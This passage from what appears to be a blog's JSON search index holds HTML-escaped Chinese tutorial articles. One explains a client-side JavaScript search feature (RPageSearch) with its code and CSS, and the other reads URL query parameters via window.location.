lt;/p&gt;&amp;nbsp;&lt;hr&gt;&lt;a&amp;nbsp;href=&quot;https://github.com/ravelloh/RPageSearch&quot;&gt;Search&amp;nbsp;powered&amp;nbsp;by&amp;nbsp;RavelloH&#39;s&amp;nbsp;RPageSearch&lt;/a&gt;&amp;nbsp;&lt;/div&gt;&amp;nbsp;&lt;/form&gt;&amp;nbsp;&lt;/div&gt;&amp;nbsp;let&amp;nbsp;input&amp;nbsp;=&amp;nbsp;document.querySelector(&quot;input[type=&#39;text&#39;]&quot;);&amp;nbsp;let&amp;nbsp;result&amp;nbsp;=&amp;nbsp;document.getElementById(&#39;resultlist&#39;)&amp;nbsp;let&amp;nbsp;button&amp;nbsp;=&amp;nbsp;document.getElementById(&#39;searchbutton&#39;)&amp;nbsp;obj&amp;nbsp;=&amp;nbsp;JSON.parse(SearchResult);&amp;nbsp;function&amp;nbsp;searchtext()&amp;nbsp;{&amp;nbsp;result.innerHTML&amp;nbsp;=&amp;nbsp;input.value;&amp;nbsp;if&amp;nbsp;(input.value&amp;nbsp;==&amp;nbsp;&#39;&#39;)&amp;nbsp;{&amp;nbsp;result.innerHTML&amp;nbsp;=&amp;nbsp;&#39;&lt;i&gt;-&amp;nbsp;搜索&amp;nbsp;-&lt;/i&gt;&lt;hr&gt;&#39;+&#39;&lt;p&amp;nbsp;align=&quot;center&quot;&gt;输入关键词以在文章标题及正文中查询&lt;/p&gt;&lt;hr&gt;&#39;&amp;nbsp;}&amp;nbsp;//&amp;nbsp;标题搜索&amp;nbsp;resultcount&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;resultstr&amp;nbsp;=&amp;nbsp;&#39;&#39;;&amp;nbsp;var&amp;nbsp;resulttitlecache&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Array()&amp;nbsp;for&amp;nbsp;(i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&lt;&amp;nbsp;obj.articles.length;&amp;nbsp;i++)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(obj.articles[i][&#39;title&#39;].includes(input.value)&amp;nbsp;==&amp;nbsp;true)&amp;nbsp;{&amp;nbsp;resulttitlecache.unshift(obj.articles[i][&#39;title&#39;])&amp;nbsp;resultcount++;&amp;nbsp;}&amp;nbsp;}&amp;nbsp;//&amp;nbsp;标题搜索结果展示&amp;nbsp;if&amp;nbsp;(resultcount&amp;nbsp;!==&amp;nbsp;0&amp;nbsp;&amp;&amp;&amp;nbsp;resultcount&amp;nbsp;!==&amp;nbsp;obj.articles.length)&amp;nbsp;{&amp;nbsp;for&amp;nbsp;(i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&lt;&amp;nbsp;resulttitlecache.length;&amp;nbsp;i++)&amp;nbsp;{&amp;nbsp;for&amp;nbsp;(j&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;j&amp;nbsp;&lt;&amp;nbsp;obj.articles.length;&amp;nbsp;j++)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(obj.articles[j][&#39;title&#39;]&amp;nbsp;==&amp;nbsp;resulttitlecache[i])&amp;nbsp;{&amp;nbsp;titlesearchresult&amp;nbsp;=&amp;nbsp;&#39;&lt;h4&gt;&lt;a&amp;nbsp;href=&quot;&#39;+obj.articles[j][&quot;path&quot;]+&#39;&quot;&amp;nbsp;class=&quot;resulttitle&quot;&gt;&#39;+obj.articles[j][&#39;title&#39;].replace(new&amp;nbsp;RegExp(input.value,&amp;nbsp;&#39;g&#39;),&amp;nbsp;&#39;&lt;mark&gt;&#39;+input.value+&#39;&lt;/mark&gt;&#39;)+&#39;&lt;/a&gt;&lt;/h4&gt;&lt;em&gt;-标题匹配&lt;/em&gt;&lt;p&amp;nbsp;class=&quot;showbox&quot;&gt;&#39;+obj.articles[j][&#39;text&#39;].substring(0,&amp;nbsp;100)+&#39;&lt;/p&gt;&#39;&amp;nbsp;resultstr&amp;nbsp;=&amp;nbsp;titlesearchresult&amp;nbsp;+&amp;nbsp;&#39;&lt;hr&gt;&#39;&amp;nbsp;+&amp;nbsp;resultstr&amp;nbsp;}&amp;nbsp;}&amp;nbsp;result.innerHTML&amp;nbsp;=&amp;nbsp;&#39;&lt;i&gt;&quot;&#39;+input.value+&#39;&quot;&lt;/i&gt;&lt;hr&gt;&#39;+resultstr;&amp;nbsp;}&amp;nbsp;}&amp;nbsp;//&amp;nbsp;正文搜索&amp;nbsp;var&amp;nbsp;resulttextcache&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Array()&amp;nbsp;for&amp;nbsp;(i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&lt;&amp;nbsp;obj.articles.length;&amp;nbsp;i++)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(obj.articles[i][&#39;text&#39;].includes(input.value)&amp;nbsp;==&amp;nbsp;true)&amp;nbsp;{&amp;nbsp;resulttextcache.unshift(obj.articles[i][&#39;text&#39;])&amp;nbsp;resultcount++;&amp;nbsp;}&amp;nbsp;}&amp;nbsp;//&amp;nbsp;正文搜索结果计数&amp;nbsp;var&amp;nbsp;targetname&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Array()&amp;nbsp;var&amp;nbsp;targetscore&amp;nbsp;=&amp;nbsp;new&amp;nbsp;Array()&amp;nbsp;if&amp;nbsp;(resulttextcache.length&amp;nbsp;!==&amp;nbsp;0&amp;nbsp;&amp;&amp;&amp;nbsp;input.value&amp;nbsp;!==&amp;nbsp;&#39;&#39;)&amp;nbsp;{&amp;nbsp;for&amp;nbsp;(i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&lt;&amp;nbsp;resulttextcache.length;&amp;nbsp;i++)&amp;nbsp;{&amp;nbsp;for&amp;nbsp;(j&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;j&amp;nbsp;&lt;&amp;nbsp;obj.articles.length;&amp;nbsp;j++)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(obj.articles[j][&#39;text&#39;]&amp;nbsp;==&amp;nbsp;resulttextcache[i])&amp;nbsp;{&amp;nbsp;targetname.unshift(obj.articles[j][&#39;title&#39;])&amp;nbsp;targetscore.unshift(obj.articles[j][&#39;text&#39;].match(RegExp(input.value,&amp;nbsp;&#39;gim&#39;)).length)&amp;nbsp;}&amp;nbsp;}&amp;nbsp;}&amp;nbsp;}&amp;nbsp;//排序相关选项&amp;nbsp;var&amp;nbsp;targetscorecache&amp;nbsp;=&amp;nbsp;targetscore.concat([]);&amp;nbsp;var&amp;nbsp;resultfortext&amp;nbsp;=&amp;nbsp;&#39;&#39;;&amp;nbsp;var&amp;nbsp;textsearchresult&amp;nbsp;=&amp;nbsp;&#39;&#39;&amp;nbsp;targetscorecache.sort(function(a,&amp;nbsp;b)&amp;nbsp;{&amp;nbsp;return&amp;nbsp;b-a&amp;nbsp;})&amp;nbsp;for&amp;nbsp;(i&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;i&amp;nbsp;&lt;&amp;nbsp;targetscorecache.length;&amp;nbsp;i++)&amp;nbsp;{&amp;nbsp;for&amp;nbsp;(j&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;j&amp;nbsp;&lt;&amp;nbsp;targetscore.length;&amp;nbsp;j++)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(targetscorecache[i]&amp;nbsp;==&amp;nbsp;targetscore[j])&amp;nbsp;{&amp;nbsp;console.log(&#39;文章排序:&#39;+targetname[j])&amp;nbsp;for&amp;nbsp;(k&amp;nbsp;=&amp;nbsp;0;&amp;nbsp;k&amp;nbsp;&lt;&amp;nbsp;obj.articles.length;&amp;nbsp;k++)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(obj.articles[k][&#39;title&#39;]&amp;nbsp;==&amp;nbsp;targetname[j])&amp;nbsp;{&amp;nbsp;//&amp;nbsp;确认选区&amp;nbsp;textorder&amp;nbsp;=&amp;nbsp;obj.articles[k][&#39;text&#39;].indexOf(input.value)&amp;nbsp;-15;&amp;nbsp;while&amp;nbsp;(textorder&amp;nbsp;&lt;&amp;nbsp;0)&amp;nbsp;{&amp;nbsp;textorder++&amp;nbsp;}&amp;nbsp;resultfortext&amp;nbsp;=&amp;nbsp;&#39;&lt;h4&gt;&lt;a&amp;nbsp;href=&quot;&#39;+obj.articles[k][&quot;path&quot;]+&#39;&quot;&amp;nbsp;class=&quot;resulttitle&quot;&gt;&#39;+obj.articles[k][&#39;title&#39;]+&#39;&lt;/a&gt;&lt;/h4&gt;&lt;em&gt;-&#39;+targetscorecache[i]+&#39;个结果&lt;/em&gt;&lt;p&amp;nbsp;class=&quot;showbox&quot;&gt;...&#39;+obj.articles[k][&#39;text&#39;].substring(textorder,&amp;nbsp;textorder+100).replace(new&amp;nbsp;RegExp(input.value,&amp;nbsp;&#39;g&#39;),&amp;nbsp;&#39;&lt;mark&gt;&#39;+input.value+&#39;&lt;/mark&gt;&#39;)+&#39;&lt;/p&gt;&#39;&amp;nbsp;textsearchresult&amp;nbsp;=&amp;nbsp;textsearchresult&amp;nbsp;+&amp;nbsp;&#39;&lt;hr&gt;&#39;&amp;nbsp;+&amp;nbsp;resultfortext;&amp;nbsp;}&amp;nbsp;}&amp;nbsp;}&amp;nbsp;}&amp;nbsp;}&amp;nbsp;//&amp;nbsp;无效结果安排&amp;nbsp;if&amp;nbsp;(resultcount&amp;nbsp;!==&amp;nbsp;obj.articles.length)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(resultcount&amp;nbsp;==&amp;nbsp;0)&amp;nbsp;{&amp;nbsp;result.innerHTML&amp;nbsp;=&amp;nbsp;&#39;&lt;i&gt;&quot;&#39;+input.value+&#39;&quot;&lt;/i&gt;&lt;hr&gt;&lt;p&amp;nbsp;align=&quot;center&quot;&gt;没有找到结果&lt;/p&gt;&#39;&amp;nbsp;}&amp;nbsp;}&amp;nbsp;//&amp;nbsp;整合&amp;nbsp;result.innerHTML&amp;nbsp;=&amp;nbsp;result.innerHTML.substring(0,&amp;nbsp;result.innerHTML.length-4)+textsearchresult.substring(0,&amp;nbsp;textsearchresult.length-4)+&#39;&lt;hr&gt;&lt;a&amp;nbsp;href=&quot;https://github.com/ravelloh/RPageSearch&quot;&amp;nbsp;class=&quot;tr&quot;&gt;Search&amp;nbsp;powered&amp;nbsp;by&amp;nbsp;RavelloH\\&#39;s&amp;nbsp;RPageSearch&lt;/a&gt;&#39;&amp;nbsp;}&amp;nbsp;当然，上述代码比复杂，接下来我会分步来说。&amp;nbsp;代码分析&amp;nbsp;前3行没什么好说的，找到对应的元素，方便后期处理。&amp;nbsp;第5行从生成的json内获取数据，之后从第六行开始是主函数，搭配html表单使用，效果是当输入时实时搜索。&amp;nbsp;7-10行判断输入框是否为空，若空替换为默认提示词。&amp;nbsp;12-21行遍历json中存储的标题，查找是否有相关字词，若有，为resultcount+1，并将完整标题加入到列表resulttitlecache中&amp;nbsp;23-34行用于展示搜索结果，条件是resultcount不为0（要能找得到结果才继续，节省运算量）且不为json中文章总数（若输入一些字符后全部删除，默认输入了&quot;&quot;，所有文章都会有反馈。），里面是两个遍历组合，第一个遍历resulttitlecache中的有结果的标题，第二个遍历总数据，搜索到契合后即可确认总数据的路径、时间、正文、标题信息，然后整合存储到resultstr中。这样因为我们在python生成数据时就是按时间顺序排列的，在这里遍历也是时间最近的结果优先。同时，第一层遍历将搜索到的resultstr中的信息整合到html中展示结果的result元素(一个id为resultlist的div)中。这里也用js替换高亮了信息里面的关键字，会给匹配的字符添加到一个mark标签内（默认黄底白字，可以用css改，比如我的博客就改成了蓝底另外加了个圆角），另外也会截取正文前100字符用于展示，但是因为字符宽度不一显示起来不整齐，要解决可以用css限制行数，css我会放在文章下面。&amp;nbsp;36-43行与12-21行相似，将搜索匹配的结果存储在resulttextcache中，不在赘述。&amp;nbsp;45-57行也类似于23-34行，为两个嵌套的遍历，不同的是这个不写入，而是记录搜索结果中含关键词的总数，方便后续排序。具体做法是创建两个列表targetname和targetscore，targetname记录resulttextcache中的正文内容，targetscore记录对应含关键词的数量。这两个是一一对应的关系，比如targetname的第二项所含的关键词总数就等于targetscore第二项记录的数字。&amp;nbsp;59-84行花了大功夫排序，首先创建一个targetscore的备份targetscorecache，但是要深拷贝*关乎js数组知识，若只是简单的var&amp;nbsp;a=b则a&amp;nbsp;b共享存储位置，换句话说就是a变b也变，对一维数组可以简单的使用a=b.concat([])来解决，之后以数组sort方式排序，此时targetscorecache为降序排列，targetscore保持原顺序不变，之后套三层遍历（应该还能继续优化，但我懒得做了，又不是不能用，性能影响也不大）前两层嵌套和之前搜索匹配的23-34、45-57相同，不过这次匹配的是targetscorecache与targetscore，之后再从总数据到json种找到正文匹配的文章，获取到对应的path、title、time和text，然后是类似于23-34到写入过程，这里值得注意有三点，一是这次高亮的是text中的结果，2是这里也会用上作为排序依据的targetscore，在标题下方展示相应的结果数（见最上方用于展示的图片），三是这里生成的html代码不直接写入而是存储到变量textsearchresult中，方便最后整合的时候删掉多余的hr标签。&amp;nbsp;86-91给上面接底，如果啥也没找到就替换为相应的文本。&amp;nbsp;最后92-93用来整合、合并标题搜索与正文搜索的内容，顺便加上个powered&amp;nbsp;by的后缀，这里你也可以替换为你自己的文字，或者干脆连前面的hr标签也一起删掉，但我还是希望能留下个注释标明出处。&amp;nbsp;上述就是js进行本地运算的过程，至于若想达到和我博客相同的效果，css是必不可少的，这里简单罗列一下css及相关的js。&amp;nbsp;&lt;!--&amp;nbsp;CSS&amp;nbsp;--&gt;&amp;nbsp;form.searchbox&amp;nbsp;input[type=text]&amp;nbsp;{&amp;nbsp;color:&amp;nbsp;#c6c9ce;&amp;nbsp;height:&amp;nbsp;30px;&amp;nbsp;padding:&amp;nbsp;5px;&amp;nbsp;font-size:&amp;nbsp;12px;&amp;nbsp;float:&amp;nbsp;left;&amp;nbsp;width:&amp;nbsp;80%;&amp;nbsp;background:&amp;nbsp;#000000;&amp;nbsp;border:&amp;nbsp;1px&amp;nbsp;solid&amp;nbsp;#1e1e1e;&amp;nbsp;border-radius:&amp;nbsp;10px&amp;nbsp;0px&amp;nbsp;0px&amp;nbsp;10px;&amp;nbsp;}&amp;nbsp;form.searchbox&amp;nbsp;button&amp;nbsp;{&amp;nbsp;height:&amp;nbsp;30px;&amp;nbsp;float:&amp;nbsp;left;&amp;nbsp;width:&amp;nbsp;20%;&amp;nbsp;padding:&amp;nbsp;5px;&amp;nbsp;background:&amp;nbsp;#1e1e1e;&amp;nbsp;color:&amp;nbsp;white;&amp;nbsp;font-size:&amp;nbsp;12px;&amp;nbsp;border:&amp;nbsp;none;&amp;nbsp;cursor:&amp;nbsp;pointer;&amp;nbsp;border:&amp;nbsp;1px&amp;nbsp;solid&amp;nbsp;#1e1e1e;&amp;nbsp;border-radius:&amp;nbsp;0px&amp;nbsp;10px&amp;nbsp;10px&amp;nbsp;0px;&amp;nbsp;text-align:&amp;nbsp;center;&amp;nbsp;line-height:&amp;nbsp;10px;&amp;nbsp;margin:&amp;nbsp;auto;&amp;nbsp;}&amp;nbsp;form.searchbox&amp;nbsp;button:hover&amp;nbsp;{&amp;nbsp;background:&amp;nbsp;#0b7dda;&amp;nbsp;transition:&amp;nbsp;background&amp;nbsp;0.2s;&amp;nbsp;}&amp;nbsp;form.searchbox::after&amp;nbsp;{&amp;nbsp;content:&amp;nbsp;&quot;&quot;;&amp;nbsp;clear:&amp;nbsp;both;&amp;nbsp;display:&amp;nbsp;table;&amp;nbsp;}&amp;nbsp;.resultlist&amp;nbsp;{&amp;nbsp;top:&amp;nbsp;-20px;&amp;nbsp;height:&amp;nbsp;0;&amp;nbsp;width:&amp;nbsp;100%;&amp;nbsp;transition:&amp;nbsp;height&amp;nbsp;0.4s;&amp;nbsp;background:&amp;nbsp;#000000;&amp;nbsp;color:&amp;nbsp;#c6c9ce;&amp;nbsp;}&amp;nbsp;.resultlist#active&amp;nbsp;{&amp;nbsp;border-radius:&amp;nbsp;10px;&amp;nbsp;border:&amp;nbsp;1px&amp;nbsp;solid&amp;nbsp;#1e1e1e;&amp;nbsp;height:&amp;nbsp;40%;&amp;nbsp;}&amp;nbsp;.resultlist&amp;nbsp;*&amp;nbsp;{&amp;nbsp;margin:&amp;nbsp;2px;&amp;nbsp;}&amp;nbsp;.resulttitle&amp;nbsp;{&amp;nbsp;color:&amp;nbsp;#ffffff;&amp;nbsp;font-size:&amp;nbsp;1em;&amp;nbsp;}&amp;nbsp;#info&amp;nbsp;{&amp;nbsp;opacity:&amp;nbsp;1;&amp;nbsp;transition:&amp;nbsp;opacity&amp;nbsp;0.4s;&amp;nbsp;}&amp;nbsp;#hidden&amp;nbsp;{&amp;nbsp;opacity:&amp;nbsp;0;&amp;nbsp;}&amp;nbsp;.fc&amp;nbsp;{&amp;nbsp;text-align:&amp;nbsp;center;&amp;nbsp;}&amp;nbsp;.title&amp;nbsp;{&amp;nbsp;max-width:&amp;nbsp;45%;&amp;nbsp;}&amp;nbsp;.tr&amp;nbsp;{&amp;nbsp;text-align:&amp;nbsp;right&amp;nbsp;}&amp;nbsp;mark&amp;nbsp;{&amp;nbsp;background-color:&amp;nbsp;#0b7dda;&amp;nbsp;border-radius:&amp;nbsp;4px;&amp;nbsp;color:&amp;nbsp;#fff;&amp;nbsp;margin:&amp;nbsp;0;&amp;nbsp;}&amp;nbsp;.showbox&amp;nbsp;{&amp;nbsp;display:&amp;nbsp;-webkit-box;&amp;nbsp;-webkit-box-orient:&amp;nbsp;vertical;&amp;nbsp;-webkit-line-clamp:&amp;nbsp;2;&amp;nbsp;overflow:&amp;nbsp;hidden;&amp;nbsp;margin:&amp;nbsp;2px&amp;nbsp;!important&amp;nbsp;}&amp;nbsp;//&amp;nbsp;JS&amp;nbsp;添加到刚才所有JS的最上方&amp;nbsp;function&amp;nbsp;check()&amp;nbsp;{&amp;nbsp;return&amp;nbsp;false;&amp;nbsp;}&amp;nbsp;function&amp;nbsp;maxfor(arr)&amp;nbsp;{&amp;nbsp;var&amp;nbsp;len&amp;nbsp;=&amp;nbsp;arr.length;&amp;nbsp;var&amp;nbsp;max&amp;nbsp;=&amp;nbsp;-Infinity;&amp;nbsp;while&amp;nbsp;(len--)&amp;nbsp;{&amp;nbsp;if&amp;nbsp;(arr[len]&amp;nbsp;&gt;&amp;nbsp;max)&amp;nbsp;{&amp;nbsp;max&amp;nbsp;=&amp;nbsp;arr[len];&amp;nbsp;}&amp;nbsp;}&amp;nbsp;return&amp;nbsp;max;&amp;nbsp;}&amp;nbsp;//&amp;nbsp;下面的和刚才的代码有部分重复，替换就行&amp;nbsp;let&amp;nbsp;input&amp;nbsp;=&amp;nbsp;document.querySelector(&quot;input[type=&#39;text&#39;]&quot;);&amp;nbsp;let&amp;nbsp;result&amp;nbsp;=&amp;nbsp;document.getElementById(&#39;resultlist&#39;)&amp;nbsp;let&amp;nbsp;infos&amp;nbsp;=&amp;nbsp;document.getElementById(&#39;info&#39;)&amp;nbsp;let&amp;nbsp;button&amp;nbsp;=&amp;nbsp;document.getElementById(&#39;searchbutton&#39;)&amp;nbsp;input.addEventListener(&quot;focus&quot;,&amp;nbsp;e&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;result.style.height&amp;nbsp;=&amp;nbsp;&#39;40%&#39;&amp;nbsp;result.style.overflow&amp;nbsp;=&amp;nbsp;&#39;auto&#39;&amp;nbsp;result.style.padding&amp;nbsp;=&amp;nbsp;&#39;3px&#39;&amp;nbsp;infos.id&amp;nbsp;=&amp;nbsp;&#39;hidden&#39;&amp;nbsp;})&amp;nbsp;input.addEventListener(&quot;blur&quot;,&amp;nbsp;e&amp;nbsp;=&gt;&amp;nbsp;{&amp;nbsp;result.style.height&amp;nbsp;=&amp;nbsp;&#39;0&#39;&amp;nbsp;result.style.overflow&amp;nbsp;=&amp;nbsp;&#39;hidden&#39;&amp;nbsp;result.style.padding&amp;nbsp;=&amp;nbsp;&#39;0&#39;&amp;nbsp;infos.id&amp;nbsp;=&amp;nbsp;&#39;info&#39;&amp;nbsp;})&amp;nbsp;//&amp;nbsp;下方应为obj的定义&amp;nbsp;后言&amp;nbsp;上述就是目前这个版本搜索的实现，理论上来说这个和前面一篇文章一样，内容都是关于伪动态的，因为搜索这个功能到我写这篇文章为止，都是先存数据库，然后在搜索时拿去数据库比对，之后返回结果，像我这样把搜索过程全搬到用户端的估计全互联网我还是第一人。不过这样也有利有弊，最大的利是节省了服务器，而弊端就是搜索速度依靠用户端设备算力，另外就是在内容太多时需要先将json下载到本地才能搜索（这是必要的，但是可以通过预加载等方式提前这个过程加快）&amp;nbsp;做了这几篇文章，可以简单归纳伪动态：用其他脚本处理整合数据，前端用js处理。这里整合的载体是json，前面的EverydayNews载体是固定的文件夹结构，PSGameSpider则是混合，将数据直接写入定时更新生成的html的js部分数组里，读取则是靠固定文件夹结构。&amp;nbsp;说回主角，我把它在Github立了个项，放在Github@RavelloH/RPageSearch中，现在没有时间不会再去更新它，但是以后(也可能是很久以后)会陆续升级一下，加入模糊搜索等功能。&amp;nbsp;","img":["/articles/20220825/show1.jpg"],"links":["/articles/20230812/","/articles/","https://github.com/ravelloh/ravelloh.github.io","https://github.com/ravelloh/RPageSearch"]},{"name":"论静态页中伪动态的实现","url":"/articles/20220708/","time":"2022-07-08","class":["技术","设计"],"tag":["javascript","html","python"],"title":["前言","效果","实现方法","链接识别","页面自动构建","githubactions","api+前端即时渲染"],"context":"&amp;nbsp;*注:此文章Javascript代码框可以“运行”以查看效果。为了充分展示所有功能，建议先点击此处补充全链接内容。&amp;nbsp;前言&amp;nbsp;最近半年里，我先后完成了PSGameSpider与EverydayNews&amp;nbsp;这两个项目，它们都是基于GithubPages的静态页，但其中都多多少少可以实现动态站的部分功能，如识别网址后的？xxx=xxx并作出反馈（EverydayNews），或者动态根据Github中的仓库内容渲染页面（PSGameSpider）。&amp;nbsp;不过，这实质上也并没有改变这作为静态站的本质，因为这不符合动态站“个性化为不同用户展示页面”的特点。&amp;nbsp;实际上，“伪动态”这个名词是类比“伪静态”而产生的，但不同于伪静态中可以用服务器正则判断并生成网页，静态站中想要实现部分动态站的效果就只能靠在用户的设备上执行脚本，并使用已有的静态资源做出反馈。&amp;nbsp;下面是其中一部分功能的实现效果及方法:&amp;nbsp;效果&amp;nbsp;链接识别&amp;nbsp;页面自动生成详见Github:PSGameSpider。&amp;nbsp;实现方法&amp;nbsp;链接识别&amp;nbsp;JavaScript中自带有识别当前页面的链接的方法window.location.search，可以用来识别当前页面的链接。&amp;nbsp;local.search可以识别链接中带?及其后的内容。除此之外，还有下列类似的获取页面url的方法：&amp;nbsp;*注:下列列表中的内容可以点击执行以查看效果。为了充分展示所有功能，建议先点击此处补充全链接内容。&amp;nbsp;window.location.href&amp;nbsp;-&amp;nbsp;识别整个链接&amp;nbsp;window.location.origin&amp;nbsp;-&amp;nbsp;识别协议+域名&amp;nbsp;window.location.protocol&amp;nbsp;-&amp;nbsp;识别协议&amp;nbsp;window.location.host&amp;nbsp;-&amp;nbsp;识别域名+端口*当端口为默认值80时返回空字符串&amp;nbsp;window.location.hostname&amp;nbsp;-&amp;nbsp;识别域名&amp;nbsp;window.location.port&amp;nbsp;-&amp;nbsp;识别端口*当端口为默认值80时返回空字符串&amp;nbsp;window.location.pathname&amp;nbsp;-&amp;nbsp;识别页面路径&amp;nbsp;window.location.hash&amp;nbsp;-&amp;nbsp;识别#及其内容&amp;nbsp;window.location.search&amp;nbsp;-&amp;nbsp;识别？及其内容&amp;nbsp;这里可以运用此方法实现？xxx=xxx的识别：&amp;nbsp;//&amp;nbsp;JavaScript&amp;nbsp;var&amp;nbsp;local&amp;nbsp;=&amp;nbsp;window.location.search;&amp;nbsp;if&amp;nbsp;(local.substring(0,&amp;nbsp;6)&amp;nbsp;==&amp;nbsp;&#39;?text=&#39;)&amp;nbsp;{&amp;nbsp;var&amp;nbsp;text&amp;nbsp;=&amp;nbsp;local.substring(6);&amp;nbsp;alert(text);&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;alert(&#39;没有text参数&#39;);&amp;nbsp;}&amp;nbsp;&gt;&gt;运行&lt;&lt;&amp;nbsp;function&amp;nbsp;textalert()&amp;nbsp;{&amp;nbsp;var&amp;nbsp;local&amp;nbsp;=&amp;nbsp;window.location.search;&amp;nbsp;if&amp;nbsp;(local.substring(0,&amp;nbsp;6)&amp;nbsp;==&amp;nbsp;&#39;?text=&#39;)&amp;nbsp;{&amp;nbsp;var&amp;nbsp;text&amp;nbsp;=&amp;nbsp;local.substring(6);&amp;nbsp;alert(text);&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;alert(&quot;没有text参数&quot;);&amp;nbsp;}&amp;nbsp;}&amp;nbsp;上述代码中实现了一个识别当前页面的链接的方法，如果识别的链接中包含了一个参数，这个参数的名字是text，那么就会弹出一个提示框，提示这个参数的值。&amp;nbsp;但是此方法也有局限性，就是只能识别一个参数，如果链接中有多个参数，那么就会带着后面的参数一起输出。&amp;nbsp;为了解决这个问题，我们可以从参数的分割符&amp;下手，当存在&amp;时截断数据:&amp;nbsp;//&amp;nbsp;JavaScript&amp;nbsp;var&amp;nbsp;local&amp;nbsp;=&amp;nbsp;window.location.search;&amp;nbsp;if&amp;nbsp;(local.substring(0,&amp;nbsp;6)&amp;nbsp;==&amp;nbsp;&#39;?text=&#39;)&amp;nbsp;{&amp;nbsp;var&amp;nbsp;text&amp;nbsp;=&amp;nbsp;local.substring(6);&amp;nbsp;var&amp;nbsp;text2&amp;nbsp;=&amp;nbsp;text.substring(0,&amp;nbsp;text.indexOf(&#39;&amp;&#39;));&amp;nbsp;alert(text2);&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;alert(&quot;没有text参数&quot;);&amp;nbsp;}&amp;nbsp;&gt;&gt;运行&lt;&lt;&amp;nbsp;function&amp;nbsp;textalert2()&amp;nbsp;{&amp;nbsp;var&amp;nbsp;local&amp;nbsp;=&amp;nbsp;window.location.search;&amp;nbsp;if&amp;nbsp;(local.substring(0,&amp;nbsp;6)&amp;nbsp;==&amp;nbsp;&#39;?text=&#39;)&amp;nbsp;{&amp;nbsp;var&amp;nbsp;text&amp;nbsp;=&amp;nbsp;local.substring(6);&amp;nbsp;var&amp;nbsp;text2&amp;nbsp;=&amp;nbsp;text.substring(0,&amp;nbsp;text.indexOf(&#39;&amp;&#39;));&amp;nbsp;alert(text2);&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;alert(&quot;没有text参数&quot;);&amp;nbsp;}&amp;nbsp;}&amp;nbsp;不过这样还不够优雅，如果我们需要的参数没有排在第一位，那么我们可以使用正则表达式来实现：&amp;nbsp;//&amp;nbsp;JavaScript&amp;nbsp;var&amp;nbsp;local&amp;nbsp;=&amp;nbsp;window.location.search;&amp;nbsp;var&amp;nbsp;reg&amp;nbsp;=&amp;nbsp;/text=(.*)/;&amp;nbsp;var&amp;nbsp;result&amp;nbsp;=&amp;nbsp;reg.exec(local);&amp;nbsp;if&amp;nbsp;(result&amp;nbsp;!=&amp;nbsp;null)&amp;nbsp;{&amp;nbsp;alert(result[1]);&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;alert(&quot;没有text参数&quot;);&amp;nbsp;}&amp;nbsp;&gt;&gt;运行&lt;&lt;&amp;nbsp;function&amp;nbsp;textalert3()&amp;nbsp;{&amp;nbsp;var&amp;nbsp;local&amp;nbsp;=&amp;nbsp;window.location.search;&amp;nbsp;var&amp;nbsp;reg&amp;nbsp;=&amp;nbsp;/text=(.*)/;&amp;nbsp;var&amp;nbsp;result&amp;nbsp;=&amp;nbsp;reg.exec(local);&amp;nbsp;if&amp;nbsp;(result&amp;nbsp;!=&amp;nbsp;null)&amp;nbsp;{&amp;nbsp;alert(result[1]);&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;alert(&quot;没有text参数&quot;);&amp;nbsp;}&amp;nbsp;}&amp;nbsp;通过对上面的代码的进一步加工，我们就能做到分别提取参数的值，并且可以解决多个参数的问题。&amp;nbsp;下面是一个完整的例子：&amp;nbsp;function&amp;nbsp;textalert4()&amp;nbsp;{&amp;nbsp;//判断有没有？&amp;nbsp;var&amp;nbsp;local&amp;nbsp;=&amp;nbsp;window.location.search;&amp;nbsp;if&amp;nbsp;(local.substring(0,&amp;nbsp;1)&amp;nbsp;==&amp;nbsp;&#39;?&#39;)&amp;nbsp;{&amp;nbsp;//如果只有一个参数，那么直接弹出提示框&amp;nbsp;if&amp;nbsp;(local.substring(1).indexOf(&#39;&amp;&#39;)&amp;nbsp;==&amp;nbsp;-1)&amp;nbsp;{&amp;nbsp;alert(local.substring(1));&amp;nbsp;}&amp;nbsp;else&amp;nbsp;{&amp;nbsp;//遍历替换所有&amp;为?&amp;nbsp;var&amp;nbsp;local&amp;nbsp;=&amp;nbsp;window.location.search;&amp;nbsp;var&amp;nbsp;reg&amp;nbsp;=&amp;nbsp;/&amp;/g;&amp;nbsp;var&amp;nbsp;result&amp;nbsp;=&amp;nbsp;reg.exec(local);&amp;nbsp;if&amp;nbsp;(result&amp;nbsp;!=&amp;nbsp;null)&amp;nbsp;{&amp;nbsp;local2&amp;nbsp;=&amp;nbsp;local.replace(reg,&amp;nbsp;&quot;?&quot;);&amp;nbsp;}&amp;nbsp;//删除相邻的?&amp;nbsp;var&amp;nbsp;reg2&amp;nbsp;=&amp;nbsp;/\\?{2,}/;&amp;nbsp;var&amp;nbsp;result2&amp;nbsp;=&amp;nbsp;reg2.exec(local2);&amp;nbsp;if&amp;nbsp;(result2&amp;nbsp;!=&amp;nbsp;null)&amp;nbsp;{&amp;nbsp;var&amp;nbsp;local3&amp;